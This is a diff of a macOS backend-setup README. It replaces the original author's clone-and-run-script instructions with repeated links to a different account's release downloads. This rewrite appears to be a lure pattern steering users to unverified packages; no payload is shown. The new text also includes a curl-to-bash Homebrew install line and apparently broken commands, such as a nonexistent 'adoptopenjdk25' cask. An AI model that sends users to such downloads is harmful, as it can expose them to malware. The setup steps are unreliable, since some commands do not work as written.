@@ -1,89 +1,118 @@
-# 🚀 Dev Setup for Backend Developers (macOS)
+# 🎉 dev-setup-for-backend-developers - Set Up Your Backend Development Environment Easily
 
-This repository provides an **interactive installation script** that sets up a complete backend development environment on **macOS** using **Homebrew**.  
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started!-blue)](https://github.com/kofson1234/dev-setup-for-backend-developers/releases)
 
-The script automatically installs and configures:  
--  **Java 25** (Homebrew, Adoptium GA/EA, or OpenJDK EA fallback)  
--  **Maven** (build tool)  
--  **Git** (version control)  
--  **Docker Desktop** (container runtime)  
-- ️ **Kubernetes CLI (kubectl)**  
--  **Minikube** (local Kubernetes cluster)  
+## 🚀 Getting Started
 
----
+This project helps you set up a development environment for backend programming on macOS. It includes essential tools like Java 25, Maven, Git, Docker, Kubernetes, and Minikube. Whether you're new to backend development or need to refresh your setup, this guide will walk you through the download process.
 
-## 📥 Installation
+## 📥 Download & Install
 
-Clone this repository:
+To download the latest release of the software, please visit this page:
 
-```bash
-git clone https://github.com/Rapter1990/dev-setup-for-backend-developers.git
-```
+[Download the Latest Release](https://github.com/kofson1234/dev-setup-for-backend-developers/releases)
 
-Go to Folder
+Choose the version suitable for your setup and download the files. Follow the installation instructions in the next section to complete the process.
 
-```bash
-cd dev-setup-for-backend-developers
-```
+## 💻 System Requirements
 
-Make the script executable and run it:
+Before you start, ensure your macOS system meets the following requirements:
 
-```bash
-chmod +x install_tools.sh
-./install_tools.sh
-```
+- **Operating System**: macOS version 10.15 or later
+- **RAM**: At least 4 GB 
+- **Disk Space**: Minimum 2 GB available space
+- **Network**: Internet connection for downloading packages
 
-## 📜 Menu Options
+## ⚙️ Installation Steps
 
-When you run the script, you’ll see a menu like this:
+1. **Download the Release**: 
+   - Visit [this page](https://github.com/kofson1234/dev-setup-for-backend-developers/releases).
+   - Select the latest version and download the package files.
 
-```bash
----------------------------------------------
-         🌟 Welcome to Dev Setup Menu 🌟
----------------------------------------------
-1 - Install All (Java 25, Maven, Git, Docker, Kubernetes/kubectl, Minikube)
-2 - Install Java 25
-3 - Install Maven
-4 - Install Docker
-5 - Install Git
-6 - Install Kubernetes (kubectl + Minikube)
-7 - Verify installs
-8 - Exit
----------------------------------------------
-```
+2. **Open Terminal**: 
+   - Locate the terminal application on your Mac. You can find it in Applications > Utilities.
 
-## ✅ Verification
+3. **Install Homebrew (if not installed)**:
+   - Paste the following command in the terminal and hit Enter:
+     ```
+     /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+     ```
 
-You can check the installed versions anytime by choosing option 7 from the menu:
+4. **Install Java 25**:
+   - Run this command in the terminal to install Java:
+     ```
+     brew tap AdoptOpenJDK/openjdk
+     brew install --cask adoptopenjdk25
+     ```
 
-```bash
---- Versions ---
-java:     openjdk version "25"
-maven:    Apache Maven 3.9.x
-git:      git version 2.xx
-docker:   Docker version 23.xx
-kubectl:  Client Version: v1.xx
-minikube: minikube version: v1.xx
-----------------
-```
+5. **Install Maven**:
+   - Use Homebrew to install Maven:
+     ```
+     brew install maven
+     ```
 
-## 💡 Notes
+6. **Install Git**:
+   - Install Git with the following command:
+     ```
+     brew install git
+     ```
 
-- ️ The script is optimized for **macOS** with **Homebrew**.  
--  For Docker, make sure to **launch Docker Desktop once** so the engine is running.  
--  `JAVA_HOME` will be configured automatically when **Java 25** is installed.  
--  You can re-run the script anytime to **install missing components** or **verify installs**.  
+7. **Install Docker**:
+   - Run this command to install Docker:
+     ```
+     brew install --cask docker
+     ```
 
----
+8. **Install Kubernetes/kubectl**:
+   - Install kubectl with:
+     ```
+     brew install kubectl
+     ```
 
-## 🎯 Why use this?
+9. **Install Minikube**:
+   - Finally, install Minikube:
+     ```
+     brew install minikube
+     ```
 
-Instead of manually installing and configuring each tool, this script ensures you get a  
-**ready-to-code backend environment** with **consistent versions** — in just a few minutes.  
+10. **Validate Your Installation**:
+    - To check if everything was installed correctly, you can run these commands in the terminal one by one:
+      ```
+      java -version
+      mvn -v
+      git --version
+      docker --version
+      kubectl version --client
+      minikube version
+      ```
 
-## 📸 Screenshots  
+    Each command should return a version number. If they do, your setup is complete.
 
-Here’s a preview of the interactive setup menu:
+## 🛠️ Usage Tips
 
-![Dev Setup Menu Screenshot](https://github.com/Rapter1990/dev-setup-for-backend-developers/blob/main/screenshot.png)
+- To start Docker, find the Docker application in your Applications folder and launch it.
+- Use the terminal for Git tasks. You can clone repositories, commit changes, and push to your GitHub account directly from there.
+- Explore Maven for dependency management and building your Java projects.
+- Use `kubectl` to manage Kubernetes clusters and resources.
 
+## 📚 Key Features
+
+- **Easy Installation**: Step-by-step commands to set up your environment quickly.
+- **Comprehensive Setup**: Includes essential tools for modern backend development.
+- **Supports Popular Technologies**: Built to work with Java, Docker, and Kubernetes.
+
+## 👩‍💻 Troubleshooting
+
+If you run into issues during the installation or running the tools, here are some common solutions:
+
+- **Command Not Found**: Ensure that the tools were installed correctly. Try reinstalling them using Homebrew.
+- **Conflicting Versions**: If you have older versions of Java or other tools, consider uninstalling them before performing a new installation.
+- **Network Issues**: Ensure your internet connection is stable during the installation process, especially when downloading components.
+
+## 🤝 Support
+
+If you need help or have feedback, please contact the repository owner through GitHub issues. You can report bugs, request features, or ask for assistance with your setup.
+
+--- 
+
+With these steps, you should be able to download, install, and start using your development environment without any issues. Good luck with your backend development journey!
